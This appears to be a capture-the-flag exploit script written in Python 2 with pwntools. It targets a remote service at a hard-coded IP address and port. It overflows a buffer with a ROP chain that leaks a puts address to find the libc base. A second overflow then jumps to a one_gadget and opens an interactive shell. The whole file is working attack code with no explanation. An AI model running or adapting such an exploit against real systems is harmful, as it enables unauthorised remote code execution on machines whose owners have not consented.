#!/usr/bin/env python2
from pwn import *
import sys
context.terminal=["terminator","-e"]

pad="A"*520

pad_in=lambda x:x+("\x00"*(1023-len(x)))
pad8=lambda x:x+("\x00"*(8-len(x)))

control_chars=''.join(map(chr,[1,2,3,4,8,13,17,18,19,21,22,23,26,27,28,127]))

#for some reason \x16 is the escape character


def chr_esc(c):
    if(c in control_chars):
        return "\x16"+c
    return c


def str_esc(s):
    res=''
    for x in s:
        res+=chr_esc(x)
    return res


MAIN_ADDR=0x401216
PUTS_PLT=0x401030

POP_RDI=0x4014f3
POP_RSI=0x4014f1    #pop r15
NOP=0x4014f4
FLAG_STR=0x402049
PAD=p64(0x4141414141414141)


PUTS_GOT=0x404018


# LIBC SPECIFIC
#PUTS_OFF=0x72a40
#ONE_GADGET=0x45254 #[rsp+0x30] == NULL

PUTS_OFF=0x68f90
ONE_GADGET=0x3f35a #[rsp+0x30] == NULL


leak_rop=''
leak_rop+= p64(POP_RDI) + p64(FLAG_STR) + p64(PUTS_PLT)
leak_rop+= p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT)
leak_rop+= p64(MAIN_ADDR)

p=remote("199.247.6.180", 10004,timeout=5)
#p=process("./random_exe_name")
#p=remote("127.0.0.1",10004)
#gdb.attach(p)
#raw_input("press [ENTER]")
p.sendline("/dev/fd/0")
p.sendline("n")
p.sendline("1024")
#p.recv()
payload=str_esc(pad_in(pad+leak_rop))
#print repr(payload)
p.sendline(payload)
libc_base=u64(pad8(p.recvlines(9)[-1][:-1]))-PUTS_OFF
log.success("Libc base = "+hex(libc_base))


#p.interactive()


rce_rop=''
rce_rop+=   p64(libc_base+ONE_GADGET) + "\x00"*0x40


p.recvline()
p.sendline("/dev/fd/0")
p.recvline()
p.sendline("n")
p.sendline("1024")
payload=str_esc(pad_in(pad+rce_rop))
p.sendline(payload)
print repr(payload)
p.interactive()#"""
